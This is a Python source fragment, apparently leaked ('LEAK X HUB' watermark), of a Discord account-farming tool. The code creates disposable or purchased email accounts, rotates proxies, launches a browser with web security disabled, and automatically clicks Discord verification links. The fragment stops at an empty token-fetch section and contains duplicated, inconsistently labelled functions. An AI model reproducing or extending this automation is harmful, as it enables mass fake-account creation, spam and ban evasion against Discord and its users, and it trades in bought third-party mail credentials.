def adb_check_connection(device: str = None) -> bool:
    try:
        device = device or ADB_DEVICE
        if not device:
            return False
        result = adb_shell_command("getprop ro.build.version.release", device)
        return result is not None
    except Exception:
        return False

def init_adb() -> bool:
    global ADB_ENABLED, ADB_DEVICE, ADB_HOST, ADB_PORT
    
    if not check_adb_installed():
        log.debug("ADB not installed or not in PATH")
        return False

    adb_config = config.get('adb', {})
    host = adb_config.get('host')
    port = adb_config.get('port')
    if host and port:
        ADB_HOST = host
        ADB_PORT = port
        output = adb_connect_remote(host, port)
        if output is None:
            log.warning("ADB remote connect returned no response")
            return False
        log.info(f"ADB remote connect output: {output}")

    device = get_adb_device()
    if not device and ADB_HOST and ADB_PORT:
        device = f"{ADB_HOST}:{ADB_PORT}"

    if not device:
        log.debug("No ADB device connected")
        return False
    
    if not adb_check_connection(device):
        log.warning("ADB device not responding")
        return False
    
    ADB_DEVICE = device
    ADB_ENABLED = True
    log.success(f"ADB initialized with device: {device}")
    return True

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# PROXY HANDLER - COMPLETELY FIXED WITH TRACKING
# ============================================================================

def parse_proxy(proxy_string: str) -> Optional[Dict]:
    if not proxy_string:
        return None
    proxy_string = proxy_string.strip()
    
    # Auto-detect proxy type
    if '://' not in proxy_string:
        if '@' in proxy_string:
            proxy_string = 'http://' + proxy_string
        else:
            proxy_string = 'http://' + proxy_string
    
    try:
        from urllib.parse import urlparse, quote
        parsed = urlparse(proxy_string)
        proxy_type = parsed.scheme.lower()
        
        host = parsed.hostname
        port = parsed.port
        username = parsed.username
        password = parsed.password
        
        if not host or not port:
            return None
        
        if username and password:
            encoded_user = quote(username, safe='')
            encoded_pass = quote(password, safe='')
            full_url = f"{proxy_type}://{encoded_user}:{encoded_pass}@{host}:{port}"
            proxy_url_no_creds = f"{proxy_type}://{host}:{port}"
            masked_url = f"{proxy_type}://{username}:***@{host}:{port}"
        else:
            full_url = f"{proxy_type}://{host}:{port}"
            proxy_url_no_creds = full_url
            masked_url = full_url
            
        return {
            'type': proxy_type,
            'host': host,
            'port': port,
            'username': username,
            'password': password,
            'full_url': full_url,
            'proxy_url_no_creds': proxy_url_no_creds,
            'masked_url': masked_url,
        }
    except Exception as e:
        log.warning(f"Failed to parse proxy: {e}")
        return None

def get_browser_proxy_args(proxy_config: Dict) -> list:
    args = []
    if not proxy_config:
        return args
    
    full_url = proxy_config.get('full_url')
    if full_url:
        args.append(f'--proxy-server={full_url}')
        args.append('--proxy-bypass-list=<-loopback>')
        args.append('--disable-features=ChromeWhatsNewUI')
        args.append('--disable-background-networking')
        args.append('--disable-web-security')
        args.append('--disable-features=IsolateOrigins,site-per-process')
        
    return args

def get_session_proxy(proxy_config: Dict) -> Optional[Dict]:
    if not proxy_config:
        return None
    full_url = proxy_config.get('full_url')
    if full_url:
        return {'http': full_url, 'https': full_url}
    return None

def load_proxies(config: dict) -> list:
    proxy_config = config.get("proxy", {})
    if not proxy_config.get("enabled", False):
        return []
    proxy_file = proxy_config.get("file", "input/proxies.txt")
    proxy_path = Path(proxy_file)
    if not proxy_path.exists():
        log.warning(f"Proxy file not found: {proxy_file}")
        return []
    try:
        proxies = []
        with open(proxy_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parsed = parse_proxy(line)
                    if parsed:
                        proxies.append(parsed)
        if proxies:
            log.success(f"Loaded {len(proxies)} proxies")
            return proxies
    except Exception as e:
        log.error(f"Error loading proxies: {e}")
    return []

async def setup_proxy_auth(browser, proxy_config: Dict):
    if not proxy_config:
        return
    
    username = proxy_config.get('username')
    password = proxy_config.get('password')
    
    if username and password:
        log.info(f"Proxy configured with authentication")
    
    return

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# PROXY TRACKING
# ============================================================================

PROXY_USAGE = {}
PROXY_USAGE_LOCK = threading.Lock()

def track_proxy_usage(proxy_string: str, success: bool):
    with PROXY_USAGE_LOCK:
        if proxy_string not in PROXY_USAGE:
            PROXY_USAGE[proxy_string] = {'used': 0, 'success': 0, 'failed': 0}
        PROXY_USAGE[proxy_string]['used'] += 1
        if success:
            PROXY_USAGE[proxy_string]['success'] += 1
        else:
            PROXY_USAGE[proxy_string]['failed'] += 1

def show_proxy_stats():
    with PROXY_USAGE_LOCK:
        if not PROXY_USAGE:
            return
        print(f"\n{YELLOW}Proxy Usage Stats:{RESET}")
        print(f"{YELLOW}{'-'*60}{RESET}")
        for proxy, stats in PROXY_USAGE.items():
            masked = proxy
            if '@' in proxy:
                parts = proxy.split('@')
                if ':' in parts[0]:
                    user = parts[0].split(':')[0]
                    masked = f"{user}:***@{parts[1]}"
            elif '://' in proxy:
                parts = proxy.split('://')
                if '@' in parts[1]:
                    host_part = parts[1].split('@')[1]
                    masked = f"{parts[0]}://***@{host_part}"
            
            success_rate = (stats['success'] / stats['used'] * 100) if stats['used'] > 0 else 0
            print(f"  {masked}: Used {stats['used']} | Success {stats['success']} | Failed {stats['failed']} | Rate: {success_rate:.0f}%")
        print(f"{YELLOW}{'-'*60}{RESET}")

PROXY_LIST = []
PROXY_LIST_LOCK = threading.Lock()

def get_random_proxy() -> Optional[Dict]:
    with PROXY_LIST_LOCK:
        if not PROXY_LIST:
            return None
        return random.choice(PROXY_LIST)

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# CROWMAIL EMAIL API
# ============================================================================

class DuckMailAPI:
    BASE_URL = "https://api.duckmail.sbs"
    
    def __init__(self, password: str = ""):
        self.password = password or ''.join(random.choices(string.ascii_letters + string.digits, k=14))
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"Content-Type": "application/json"})
        self._bearer = None
        self._email = None
        self._email_data = {}
    
    def _domain(self) -> str:
        try:
            r = self.session.get(f"{self.BASE_URL}/domains", timeout=10)
            if r.status_code == 200:
                for m in r.json().get("hydra:member", []):
                    if m.get("ownerId") is None:
                        return m["domain"]
        except:
            pass
        return "duckmail.sbs"
    
    def check_balance(self) -> float:
        return 0.0
    
    def get_stock(self) -> int:
        return 999
    
    def create_account(self, email: str = None, password: str = None, proxy: str = None) -> dict:
        try:
            domain = self._domain()
            local = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
            addr = f"{local}@{domain}"
            pw = password or self.password
            
            r = self.session.post(
                f"{self.BASE_URL}/accounts",
                json={"address": addr, "password": pw, "expiresIn": 0},
                timeout=10
            )
            if r.status_code != 201:
                return {"success": False, "error": f"Account creation failed: {r.status_code}"}
            
            token_r = self.session.post(
                f"{self.BASE_URL}/token",
                json={"address": addr, "password": pw},
                timeout=10
            )
            if token_r.status_code != 200:
                return {"success": False, "error": "Token retrieval failed"}
            
            self._bearer = token_r.json().get("token")
            self._email = addr
            self._email_data = {
                "email": addr,
                "password": pw,
                "token": self._bearer,
                "uuid": ""
            }
            
            return {
                "success": True,
                "email": addr,
                "password": pw,
                "token": self._bearer,
                "uuid": ""
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def buy_email(self) -> dict:
        return self.create_account()
    
    def get_latest_mail(self, email: str, password: str, refresh_token: str, client_id: str, folder: str = "inbox", start_timestamp: int = None) -> dict:
        if not self._bearer:
            token_r = self.session.post(
                f"{self.BASE_URL}/token",
                json={"address": email, "password": password},
                timeout=10
            )
            if token_r.status_code == 200:
                self._bearer = token_r.json().get("token")
            else:
                return {}
        
        headers = {"Authorization": f"Bearer {self._bearer}"}
        
        try:
            r = self.session.get(f"{self.BASE_URL}/messages", headers=headers, timeout=10)
            if r.status_code != 200:
                return {}
            
            messages = r.json().get("hydra:member", [])
            if not messages:
                return {}
            
            latest = messages[0]
            msg_id = latest.get("id")
            
            if not msg_id:
                return {}
            
            detail_r = self.session.get(
                f"{self.BASE_URL}/messages/{msg_id}",
                headers=headers,
                timeout=10
            )
            if detail_r.status_code != 200:
                return {}
            
            detail = detail_r.json()
            
            return {
                "id": msg_id,
                "subject": latest.get("subject", ""),
                "from": latest.get("from", {}),
                "html": detail.get("html", [""])[0] if detail.get("html") else "",
                "text": detail.get("text", ""),
                "body": detail.get("text", "") or detail.get("html", [""])[0] or ""
            }
        except Exception as e:
            return {}
    
    def get_verify_url(self, email: str, password: str, refresh_token: str = "", client_id: str = "", timeout: int = 120, proxy: str = None) -> Optional[str]:
        if not self._bearer:
            token_r = self.session.post(
                f"{self.BASE_URL}/token",
                json={"address": email, "password": password},
                timeout=10
            )
            if token_r.status_code == 200:
                self._bearer = token_r.json().get("token")
            else:
                return None
        
        headers = {"Authorization": f"Bearer {self._bearer}"}
        start_time = time.time()
        seen_ids = set()
        
        while time.time() - start_time < timeout:
            try:
                r = self.session.get(f"{self.BASE_URL}/messages", headers=headers, timeout=10)
                if r.status_code != 200:
                    time.sleep(3)
                    continue
                
                messages = r.json().get("hydra:member", [])
                
                for msg in messages:
                    msg_id = msg.get("id")
                    if not msg_id or msg_id in seen_ids:
                        continue
                    seen_ids.add(msg_id)
                    
                    subject = msg.get("subject", "").lower()
                    sender = msg.get("from", {}).get("address", "").lower()
                    
                    is_verify = (
                        ("verify" in subject or "confirm" in subject or "email" in subject or "discord" in subject) and
                        ("discord" in sender or "noreply@discord.com" in sender)
                    )
                    
                    if not is_verify:
                        continue
                    
                    detail_r = self.session.get(
                        f"{self.BASE_URL}/messages/{msg_id}",
                        headers=headers,
                        timeout=10
                    )
                    if detail_r.status_code != 200:
                        continue
                    
                    detail = detail_r.json()
                    
                    html_body = detail.get("html", [""])[0] if detail.get("html") else ""
                    text_body = detail.get("text", "") or ""
                    combined = html_body + text_body
                    
                    verify_pattern = r'https://discord\.com/verify\?token=[^"\'\>\s]+'
                    direct_match = re.search(verify_pattern, combined)
                    if direct_match:
                        try:
                            self.session.delete(f"{self.BASE_URL}/messages/{msg_id}", headers=headers)
                        except:
                            pass
                        return direct_match.group(0)
                    
                    click_pattern = r'https://click\.discord\.com/ls/click\?[^"\'\>\s]+'
                    for m in re.finditer(click_pattern, combined):
                        url = m.group(0)
                        try:
                            resp = self.session.get(url, allow_redirects=True, timeout=10)
                            if "discord.com/verify" in resp.url:
                                try:
                                    self.session.delete(f"{self.BASE_URL}/messages/{msg_id}", headers=headers)
                                except:
                                    pass
                                return resp.url
                            verify_in_body = re.search(verify_pattern, resp.text)
                            if verify_in_body:
                                try:
                                    self.session.delete(f"{self.BASE_URL}/messages/{msg_id}", headers=headers)
                                except:
                                    pass
                                return verify_in_body.group(0)
                        except:
                            pass
                
                for msg in messages[-5:]:
                    msg_id = msg.get("id")
                    if msg_id:
                        try:
                            self.session.delete(f"{self.BASE_URL}/messages/{msg_id}", headers=headers)
                        except:
                            pass
                
            except Exception as e:
                pass
            
            time.sleep(3)
        
        return None

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# CROWMAIL HELPER FUNCTIONS
# ============================================================================

def get_duckmail_email(config: dict) -> tuple:
    cm_config = config.get("email_providers", {}).get("duckmail", {})
    if not cm_config.get("enabled", False):
        return None, None, None, None
    
    password = cm_config.get("password", "")
    api = DuckMailAPI(password=password)
    result = api.create_account()
    
    if result.get("success"):
        return result.get("email"), result.get("password"), result.get("token", ""), result.get("uuid", "")
    return None, None, None, None

async def verify_email_crowmail(email: str, password: str, token: str, browser, refresh_token: str = "", client_id: str = "", timeout: int = 120) -> bool:
    api = DuckMailAPI(password=password)
    verify_url = api.get_verify_url(email, password, refresh_token, client_id, timeout)
    if verify_url:
        return await verify_email_with_url(browser, verify_url, token)
    return False

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# CYBERTEMP (DEVSMail) EMAIL API
# ============================================================================

class CyberTempAPI:
    BASE_URL = "https://api.cybertemp.xyz"
    
    def __init__(self, api_key: str = ""):
        self.api_key = api_key
        self.session = requests.Session()
        self.session.verify = False
        self.headers = {"X-API-KEY": self.api_key} if self.api_key else {}
        self.created_emails = {}
        self._email_data = {}
    
    def get_domains(self) -> list:
        try:
            resp = self.session.get(
                f"{self.BASE_URL}/getDomains",
                params={"type": "discord"},
                headers=self.headers,
                timeout=10
            )
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, dict) and "domains" in data:
                    domains_list = data["domains"]
                elif isinstance(data, list):
                    domains_list = data
                else:
                    return []
                return [d.get("domain", d) if isinstance(d, dict) else d for d in domains_list]
        except Exception as e:
            pass
        return ["cybertemp.xyz", "temp.cybertemp.xyz", "discord.cybertemp.xyz"]
    
    def create_account(self, email: str = None, password: str = None, proxy: str = None) -> dict:
        try:
            if email and '@' in email:
                created_email = email
            else:
                domains = self.get_domains()
                if not domains:
                    return {"success": False, "error": "No domains available"}
                domain = random.choice(domains)
                local = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
                created_email = f"{local}@{domain}"
            
            pw = password or ''.join(random.choices(string.ascii_letters + string.digits, k=14))
            
            self.created_emails[created_email] = pw
            self._email_data = {
                "email": created_email,
                "password": pw,
                "token": "",
                "uuid": ""
            }
            
            return {
                "success": True,
                "email": created_email,
                "password": pw,
                "token": "",
                "uuid": ""
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def buy_email(self) -> dict:
        return self.create_account()
    
    def get_verify_url(self, email: str, password: str, refresh_token: str = "", client_id: str = "", timeout: int = 120, proxy: str = None) -> Optional[str]:
        start_time = time.time()
        used_message_ids = set()
        last_poll_time = 0
        
        while time.time() - start_time < timeout:
            try:
                if time.time() - last_poll_time < 2:
                    time.sleep(0.5)
                    continue
                last_poll_time = time.time()
                
                resp = self.session.get(
                    f"{self.BASE_URL}/getMail",
                    params={"email": email},
                    headers=self.headers,
                    timeout=10
                )
                
                if resp.status_code == 200:
                    messages = resp.json()
                    if isinstance(messages, list) and messages:
                        for msg in reversed(messages):
                            msg_id = msg.get("id")
                            if msg_id in used_message_ids:
                                continue
                            
                            subject = msg.get("subject", "").lower()
                            from_addr = msg.get("from", "").lower()
                            
                            is_verify = (
                                ("verify" in subject or "confirm" in subject or "verif" in subject or "discord" in subject) and
                                ("discord" in from_addr or "noreply@discord.com" in from_addr)
                            )
                            
                            if not is_verify:
                                used_message_ids.add(msg_id)
                                continue
                            
                            html_body = msg.get("html", "") or msg.get("body", "") or ""
                            text_body = msg.get("text", "") or ""
                            combined = html_body + text_body
                            
                            verify_pattern = r'https://discord\.com/verify\?token=[^"\'\>\s]+'
                            direct_match = re.search(verify_pattern, combined)
                            
                            if direct_match:
                                verify_url = direct_match.group(0)
                                return verify_url
                            
                            click_pattern = r'https://click\.discord\.com/ls/click\?[^"\'\>\s]+'
                            for m in re.finditer(click_pattern, combined):
                                url = m.group(0)
                                try:
                                    session = requests.Session()
                                    session.verify = False
                                    resp2 = session.get(url, allow_redirects=True, timeout=10)
                                    
                                    if "discord.com/verify" in resp2.url:
                                        return resp2.url
                                    
                                    verify_in_body = re.search(verify_pattern, resp2.text)
                                    if verify_in_body:
                                        return verify_in_body.group(0)
                                except:
                                    pass
                            
                            used_message_ids.add(msg_id)
            except Exception as e:
                pass
        
        return None

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# DUCKMAIL EMAIL API
# ============================================================================



# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# HOTMAIL007 EMAIL API
# ============================================================================

class Hotmail007API:
    def __init__(self, client_key: str, product_id = None):
        self.session = requests.Session()
        self.session.verify = False
        self.client_key = client_key
        self.base_url = "https://gapi.hotmail007.com"
        self.product_ids = []
        self.mail_types = []

        if isinstance(product_id, list):
            for item in product_id:
                if item is None:
                    continue
                value = str(item).strip()
                if not value:
                    continue
                if value.isdigit():
                    self.product_ids.append(value)
                else:
                    self.mail_types.append(value)
        elif isinstance(product_id, int):
            self.product_ids = [str(product_id)]
        elif isinstance(product_id, str) and product_id.strip():
            value = product_id.strip()
            if value.isdigit():
                self.product_ids = [value]
            else:
                self.mail_types = [value]

        if not self.product_ids and not self.mail_types:
            self.mail_types = ["hotmail"]

    def check_balance(self) -> float:
        url = f"{self.base_url}/api/user/balance"
        params = {"clientKey": self.client_key}
        try:
            resp = self.session.get(url, params=params, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, dict) and data.get("code") == 0:
                    return float(data.get("data", 0.0) or 0.0)
        except Exception:
            pass
        return 0.0
    
    def buy_email(self) -> dict:
        if not self.client_key:
            return {"success": False, "error": "Missing client_key"}
        
        candidates = self.mail_types or ["hotmail", "outlook"]
        
        for mail_type in candidates:
            url = f"{self.base_url}/api/mail/getMail"
            params = {
                "clientKey": self.client_key,
                "mailType": mail_type,
                "quantity": 1
            }
            try:
                resp = self.session.get(url, params=params, timeout=30)
                if resp.status_code == 200:
                    data = resp.json()
                    if isinstance(data, dict) and data.get("code") == 0:
                        accounts = data.get("data", [])
                        if accounts:
                            parts = accounts[0].split(":")
                            if len(parts) >= 4:
                                return {
                                    "success": True,
                                    "email": parts[0],
                                    "password": parts[1],
                                    "token": parts[2],
                                    "uuid": parts[3] if len(parts) > 3 else ""
                                }
            except Exception as e:
                pass
        
        return {"success": False, "error": "No accounts available"}

    def get_latest_mail(self, email: str, password: str, refresh_token: str, client_id: str, folder: str = "inbox", start_timestamp: int = None) -> dict:
        account = f"{email}:{password}:{refresh_token}:{client_id}"
        url = f"{self.base_url}/open/mail/latest"
        params = {
            "clientKey": self.client_key,
            "account": account,
            "folder": folder
        }
        if start_timestamp is not None:
            params["start_timestamp"] = int(start_timestamp)

        try:
            resp = self.session.get(url, params=params, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, dict) and data.get("code") == 0:
                    return data.get("data", {}) or {}
        except Exception as e:
            pass
        return {}

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# ZEUS-X EMAIL API
# ============================================================================

class ZeusXAPI:
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.base_url = "https://api.zeus-x.ru"
        self.session = requests.Session()
        self.session.verify = False
    
    def check_balance(self):
        try:
            resp = self.session.get(f"{self.base_url}/balance", params={"apikey": self.api_key}, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("Code") == 0:
                    return data.get("Balance", 0.0)
            return 0.0
        except:
            return 0.0
            
    def buy_email(self):
        if not self.api_key:
            return {"success": False, "error": "Missing api_key"}
        
        mail_types = ["HOTMAIL_TRUSTED_GRAPH_API", "HOTMAIL", "OUTLOOK"]
        
        for account_code in mail_types:
            try:
                resp = self.session.get(f"{self.base_url}/purchase", params={"apikey": self.api_key, "accountcode": account_code, "quantity": 1}, timeout=30)
                if resp.status_code == 200:
                    data = resp.json()
                    if data.get("Code") == 0:
                        accounts = data.get("Data", {}).get("Accounts", [])
                        if accounts:
                            acc = accounts[0]
                            return {
                                "success": True,
                                "email": acc.get("Email", ""),
                                "password": acc.get("Password", ""),
                                "token": acc.get("RefreshToken", ""),
                                "uuid": acc.get("ClientId", "")
                            }
            except Exception as e:
                pass
                
        return {"success": False, "error": "No accounts available"}

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# LEVERAGERS MAIL API
# ============================================================================

class MailAPI:
    def __init__(self, api_key: str = None, base_url: str = "https://leveragers.xyz"):
        self.base_url = base_url.rstrip('/')
        self.api_key = api_key
        self.session = requests.Session()
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Leveragers-API-Client/3.0'
        }
        if self.api_key:
            headers['X-API-KEY'] = self.api_key
        self.session.headers.update(headers)
    
    def _request(self, method: str, endpoint: str, **kwargs) -> Dict[str, Any]:
        url = f"{self.base_url}{endpoint}"
        try:
            response = self.session.request(method, url, **kwargs)
            if response.status_code == 204:
                return {"success": True}
            try:
                data = response.json()
            except json.JSONDecodeError:
                raise Exception(f"Invalid response")
            if not response.ok:
                error_msg = data.get('error', data.get('message', f"HTTP {response.status_code}"))
                raise Exception(f"API Error: {error_msg}")
            return data
        except requests.RequestException as e:
            raise Exception(f"Connection failed: {str(e)}")
    
    def generate_email(self, domain: str, is_private: bool = False) -> Dict[str, Any]:
        payload = {
            'domain': domain,
            'is_private': is_private
        }
        return self._request('POST', '/api/mail/generate', json=payload)
    
    def get_private_inbox(self, email_address: str, password: str) -> List[Dict[str, Any]]:
        payload = {
            'email': email_address,
            'password': password
        }
        data = self._request('POST', '/api/mail/private/inbox', json=payload)
        return data.get('emails', [])

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# PUBLIC TEMP INBOX (DRAXONO) EMAIL API
# ============================================================================

class PublicTempInboxAPI:
    def __init__(self, api_key: str = None, domain: str = None, api_base: str = None):
        self.api_key = api_key
        self.domain = domain or "durudraxon.online"
        self.base_url = api_base or "https://mail.draxono.in"
        self.client = httpx.Client(verify=False, timeout=30, follow_redirects=True)
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }
        if self.api_key:
            headers['X-API-KEY'] = self.api_key
        self.client.headers.update(headers)
    
    def _request(self, method: str, endpoint: str, **kwargs) -> Dict[str, Any]:
        url = f"{self.base_url}{endpoint}"
        try:
            response = self.client.request(method, url, **kwargs)
            try:
                data = response.json()
            except json.JSONDecodeError:
                return {"success": False, "error": "Invalid response"}
            
            if not response.is_success:
                if isinstance(data, dict):
                    error_msg = data.get('error', data.get('message', f"HTTP {response.status_code}"))
                else:
                    error_msg = f"HTTP {response.status_code}"
                return {"success": False, "error": error_msg}
            
            return data
        except (httpx.RequestError, httpx.HTTPError) as e:
            return {"success": False, "error": str(e)}
    
    def generate_email(self, domains_list: list = None) -> Dict[str, Any]:
        if domains_list and len(domains_list) > 0:
            email_domain = random.choice(domains_list)
        else:
            email_domain = self.domain
        
        random_user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        random_password = ''.join(random.choices(string.ascii_letters + string.digits + '!@#$%', k=16))
        
        email = f"{random_user}@{email_domain}"
        
        claim_result = self.claim_inbox(email, random_password)
        
        if claim_result.get("success"):
            return {
                "success": True,
                "email": email,
                "password": random_password,
                "access_code": random_user,
                "inbox_id": email
            }
        
        return claim_result
    
    def claim_inbox(self, email: str, password: str) -> Dict[str, Any]:
        try:
            payload = {
                "email": email,
                "password": password
            }
            result = self._request('POST', f'/api/v1/inbox/{email}/claim', json=payload)
            
            if result.get("success") or not result.get("error"):
                return {
                    "success": True,
                    "email": email,
                    "password": password
                }
            return result
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def get_inbox(self, email: str, password: str = None) -> List[Dict[str, Any]]:
        payload = {
            "address": email,
            "password": password or ""
        }
        result = self._request('POST', f'/api/v1/inbox/{email}', json=payload)
        
        if isinstance(result, list):
            return result
        elif isinstance(result, dict) and result.get('success'):
            return result.get('messages', [])
        return []

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# MAILCOW EMAIL API
# ============================================================================

class MailcowAPI:
    def __init__(self, mailcow_url: str, api_key: str, imap_host: str, domains: list = None):
        self.mailcow_url = mailcow_url.rstrip("/")
        self.api_key = api_key
        self.imap_host = imap_host
        self.session = requests.Session()
        self.session.verify = False
        self.domains = domains or []

    def create_mailbox(self, password: str = None) -> dict:
        domains = self.domains
        if not domains:
            return {"success": False, "error": "No domains configured"}
        
        domain = random.choice(domains)
        local_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        mail_password = password or generate_password(16)
        
        payload = {
            "active": "1",
            "domain": domain,
            "local_part": local_part,
            "name": local_part,
            "password": mail_password,
            "password2": mail_password,
            "quota": "1024",
        }
        
        try:
            resp = self.session.post(
                f"{self.mailcow_url}/add/mailbox",
                json=payload,
                headers={"X-API-Key": self.api_key, "Content-Type": "application/json"},
                timeout=30,
            )
            
            data = resp.json()
            success = False
            if isinstance(data, list):
                success = any(r.get("type") == "success" for r in data)
            elif isinstance(data, dict):
                success = data.get("status") == "success"
            
            if success:
                email_addr = f"{local_part}@{domain}"
                return {
                    "success": True,
                    "email": email_addr,
                    "password": mail_password,
                    "token": "",
                    "uuid": "",
                }
        except Exception as e:
            pass
        
        return {"success": False, "error": "Mailcow creation failed"}

    def read_inbox_imap(self, email_addr: str, password: str, retries: int = 10, delay_sec: int = 5) -> Optional[str]:
        import imaplib
        import email as email_module
        
        for attempt in range(1, retries + 1):
            try:
                mail = imaplib.IMAP4_SSL(self.imap_host, 993, timeout=10)
                mail.login(email_addr, password)
                
                status, _ = mail.select("INBOX")
                if status != "OK":
                    mail.logout()
                    time.sleep(delay_sec)
                    continue
                
                status, messages = mail.search(None, "ALL")
                if status == "OK" and messages[0]:
                    for num in reversed(messages[0].split()):
                        try:
                            _, msg_data = mail.fetch(num, "(RFC822)")
                            raw_email = msg_data[0][1]
                            parsed = email_module.message_from_bytes(raw_email)
                            
                            subject = str(parsed.get("Subject", "")).lower()
                            from_addr = str(parsed.get("From", "")).lower()
                            
                            is_verify = ("discord" in from_addr) and ("verify" in subject or "confirm" in subject)
                            
                            if is_verify:
                                body = ""
                                if parsed.is_multipart():
                                    for part in parsed.walk():
                                        if part.get_content_type() in ["text/plain", "text/html"]:
                                            try:
                                                body += part.get_payload(decode=True).decode(errors="ignore")
                                            except:
                                                pass
                                else:
                                    try:
                                        body = parsed.get_payload(decode=True).decode(errors="ignore")
                                    except:
                                        pass
                                
                                verify_pattern = r'https://discord\.com/verify\?token=[^"\'\>\s]+'
                                direct_match = re.search(verify_pattern, body)
                                if direct_match:
                                    mail.logout()
                                    return direct_match.group(0)
                        except:
                            pass
                
                mail.logout()
            except Exception as e:
                pass
            
            time.sleep(delay_sec)
        
        return None

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# EMAIL PROVIDER HELPER FUNCTIONS
# ============================================================================

def get_duckmail_email(config: dict) -> tuple:
    cm_config = config.get("email_providers", {}).get("crowmail", {})
    if not cm_config.get("enabled", False):
        return None, None, None, None
    
    password = cm_config.get("password", "")
    api = DuckMailAPI(password=password)
    result = api.create_account()
    
    if result.get("success"):
        return result.get("email"), result.get("password"), result.get("token", ""), result.get("uuid", "")
    return None, None, None, None

def get_cybertemp_email(config: dict) -> tuple:
    ct_config = config.get("email_providers", {}).get("cybertemp", {})
    if not ct_config.get("enabled", False):
        return None, None, None, None
    
    api_key = ct_config.get("api_key", "")
    api = CyberTempAPI(api_key=api_key)
    result = api.create_account()
    
    if result.get("success"):
        return result.get("email"), result.get("password"), result.get("token", ""), result.get("uuid", "")
    return None, None, None, None

def get_hotmail007_email(config: dict) -> tuple:
    h_config = config.get("email_providers", {}).get("hotmail007", {})
    if not h_config.get("enabled", False):
        return None, None, None, None
    
    client_key = h_config.get("client_key", "").strip()
    if not client_key:
        return None, None, None, None
    
    api = Hotmail007API(client_key)
    result = api.buy_email()
    
    if result.get("success"):
        return result.get("email"), result.get("password"), result.get("token", ""), result.get("uuid", "")
    return None, None, None, None

def get_zeusx_email(config: dict) -> tuple:
    z_config = config.get("email_providers", {}).get("zeusx", {})
    if not z_config.get("enabled", False):
        return None, None, None, None
    
    api_key = z_config.get("api_key", "").strip()
    if not api_key:
        return None, None, None, None
    
    api = ZeusXAPI(api_key)
    result = api.buy_email()
    
    if result.get("success"):
        return result.get("email"), result.get("password"), result.get("token", ""), result.get("uuid", "")
    return None, None, None, None

def get_leveragers_email(config: dict) -> tuple:
    l_config = config.get("email_providers", {}).get("leveragers", {})
    if not l_config.get("enabled", False):
        return None, None, None, None
    
    api_key = l_config.get("api_key", "").strip()
    if not api_key:
        return None, None, None, None
    
    api = MailAPI(api_key=api_key)
    try:
        domain = l_config.get("domain", "leveragers.xyz")
        res = api.generate_email(domain, is_private=True)
        if "email" in res:
            return res.get("email"), res.get("password"), "", ""
    except Exception:
        pass
    return None, None, None, None

def get_public_temp_inbox_email(config: dict) -> tuple:
    pti_config = config.get("email_providers", {}).get("draxono", {})
    if not pti_config.get("enabled", False):
        return None, None, None, None
    
    api_key = pti_config.get("api_key", "").strip()
    if not api_key:
        return None, None, None, None
    
    domains = pti_config.get("domains", [])
    api = PublicTempInboxAPI(api_key=api_key)
    try:
        res = api.generate_email(domains_list=domains)
        if res.get("success") and res.get("email"):
            return res.get("email"), res.get("password", ""), "", ""
    except Exception:
        pass
    return None, None, None, None

def get_mailcow_email(config: dict) -> tuple:
    mc_config = config.get("email_providers", {}).get("mailcow", {})
    if not mc_config.get("enabled", False):
        return None, None, None, None
    
    mailcow_url = mc_config.get("mailcow_url", "").strip()
    api_key = mc_config.get("api_key", "").strip()
    imap_host = mc_config.get("imap_host", "").strip()
    domains = mc_config.get("domains", [])
    
    if not mailcow_url or not api_key:
        return None, None, None, None
    
    api = MailcowAPI(mailcow_url, api_key, imap_host, domains)
    result = api.create_mailbox()
    
    if result.get("success"):
        return result.get("email"), result.get("password"), "", ""
    return None, None, None, None

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# EMAIL VERIFICATION FUNCTIONS
# ============================================================================

async def verify_email_with_url(browser, verify_url: str, token: str, timeout: int = 60) -> bool:
    if not verify_url:
        return False
    
    try:
        log.info("Opening verification link...")
        page = await browser.get(verify_url)
        await asyncio.sleep(5)
        
        for i in range(timeout // 5):
            await asyncio.sleep(5)
            
            verified, email_check = check_email_verified_api(token)
            if verified:
                log.verify(f"Account verified! Email: {log.mask_email(email_check)}")
                return True
            
            try:
                page_text = await page.evaluate('document.body.innerText')
                if "verified" in page_text.lower() or "success" in page_text.lower():
                    log.verify("Verification page shows success!")
                    return True
                if "already verified" in page_text.lower() or "already confirmed" in page_text.lower():
                    log.verify("Account was already verified!")
                    return True
            except:
                pass
        return True
    except Exception as e:
        log.warning(f"Error opening verification URL: {e}")
        return False

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# DISCORD TOKEN FETCH
# ============================================================================

